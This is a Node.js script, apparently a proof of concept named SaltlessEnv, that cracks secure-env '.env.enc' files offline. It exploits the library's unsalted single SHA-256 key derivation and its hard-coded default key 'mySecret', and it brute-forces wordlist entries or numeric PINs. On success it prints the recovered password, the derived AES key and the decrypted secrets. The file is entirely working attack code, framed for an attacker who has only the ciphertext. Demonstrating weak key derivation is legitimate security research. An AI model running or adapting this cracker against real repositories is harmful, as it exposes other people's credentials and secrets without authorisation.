#!/usr/bin/env node
'use strict'
/*
 * SaltlessEnv — offline password/secret recovery against a secure-env `.env.enc` file.
 *
 * The attacker is assumed to possess ONLY the `.env.enc` ciphertext — exactly the file
 * secure-env tells you to commit to your repository ("You can delete the .env file
 * after this, to prevent stealing").  This script never imports secure-env; it only
 * reproduces the key-derivation the attacker can read in the public source:
 *
 *     key = SHA256(password)                       // unsalted, single iteration
 *     ciphertext = IV(16 bytes) || AES-256-CBC(key, IV, plaintext)
 *
 * Because the KDF has no salt and no stretching, each guess costs exactly ONE SHA-256
 * plus one AES block — so the whole thing runs at raw-hash speed.
 */
const crypto = require('crypto')
const fs = require('fs')

const DEFAULT_SECRET = 'mySecret' // secure-env's hard-coded default key (lib/cryptography.js)

function deriveKey (password) {
  // Verbatim reproduction of secure-env's KDF:
  //   crypto.createHash('sha256').update(String(secret)).digest()
  return crypto.createHash('sha256').update(String(password)).digest()
}

function tryDecrypt (fileBuffer, password) {
  const iv = fileBuffer.slice(0, 16)
  const ciphertext = fileBuffer.slice(16)
  const key = deriveKey(password)
  try {
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv)
    let out = decipher.update(ciphertext, undefined, 'utf8')
    out += decipher.final('utf8') // throws on bad PKCS#7 padding -> wrong key
    // Confirm it really is a .env (filters the ~1/256 wrong keys that pass padding by luck)
    if (!/^[\x09\x0a\x0d\x20-\x7e]*$/.test(out)) return null
    if (!/^[A-Za-z_][A-Za-z0-9_]*\s*=/m.test(out)) return null
    return out
  } catch (e) {
    return null
  }
}

function* candidates (wordlistPath, pinDigits) {
  yield DEFAULT_SECRET // 0-bit case: the built-in default key
  if (wordlistPath && fs.existsSync(wordlistPath)) {
    for (const w of fs.readFileSync(wordlistPath, 'utf8').split(/\r?\n/)) {
      if (w.length) yield w
    }
  }
  if (pinDigits) {
    const max = Math.pow(10, pinDigits)
    for (let i = 0; i < max; i++) yield String(i).padStart(pinDigits, '0')
  }
}

function crack (encFile, { wordlist, pinDigits } = {}) {
  const fileBuffer = fs.readFileSync(encFile)
  let tried = 0
  const start = process.hrtime.bigint()
  for (const pw of candidates(wordlist, pinDigits)) {
    tried++
    const pt = tryDecrypt(fileBuffer, pw)
    if (pt !== null) {
      const secs = Number(process.hrtime.bigint() - start) / 1e9
      return { found: true, password: pw, plaintext: pt, tried, secs }
    }
  }
  const secs = Number(process.hrtime.bigint() - start) / 1e9
  return { found: false, tried, secs }
}

function benchmarkHashRate () {
  // How many candidate passwords/sec can this ordinary machine test? (1 SHA-256 each)
  const start = process.hrtime.bigint()
  const N = 1_000_000
  for (let i = 0; i < N; i++) crypto.createHash('sha256').update('guess' + i).digest()
  const secs = Number(process.hrtime.bigint() - start) / 1e9
  return Math.round(N / secs)
}

if (require.main === module) {
  const encFile = process.argv[2] || '.env.enc'
  const mode = process.argv[3] || 'wordlist' // 'wordlist' | 'pin4' | 'pin6'
  const opts = {}
  if (mode === 'wordlist') opts.wordlist = process.argv[4] || 'wordlist.txt'
  if (mode === 'pin4') opts.pinDigits = 4
  if (mode === 'pin6') opts.pinDigits = 6

  console.log(`\n[*] Target ciphertext : ${encFile} (${fs.statSync(encFile).size} bytes)`)
  console.log(`[*] Attack mode       : ${mode}`)
  const r = crack(encFile, opts)
  if (r.found) {
    const key = deriveKey(r.password).toString('hex')
    console.log(`[+] RECOVERED after ${r.tried} guesses in ${r.secs.toFixed(3)}s ` +
                `(${Math.round(r.tried / r.secs).toLocaleString()} guesses/s)`)
    console.log(`[+] Password          : "${r.password}"`)
    console.log(`[+] Derived AES key   : ${key}  <-- SHA256(password), no salt`)
    console.log(`[+] Recovered secrets :\n` + r.plaintext.trim().split('\n').map(l => '      ' + l).join('\n'))
  } else {
    console.log(`[-] Not found in this space (${r.tried} guesses, ${r.secs.toFixed(3)}s)`)
  }
}

module.exports = { deriveKey, tryDecrypt, crack, benchmarkHashRate, DEFAULT_SECRET }
